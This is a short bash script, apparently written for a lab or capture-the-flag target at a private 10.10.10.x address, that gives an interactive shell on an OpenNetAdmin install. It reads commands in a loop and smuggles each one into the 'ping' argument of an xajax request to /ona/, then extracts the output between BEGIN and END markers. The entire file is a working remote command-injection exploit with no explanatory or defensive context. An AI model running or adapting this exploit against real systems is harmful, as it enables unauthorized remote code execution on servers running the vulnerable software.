#!/bin/bash

val = 0
while [[ $val -le 100 ]]; do

	val=$((val+=1))
	echo "$ " ;read cmd
	curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p'

done
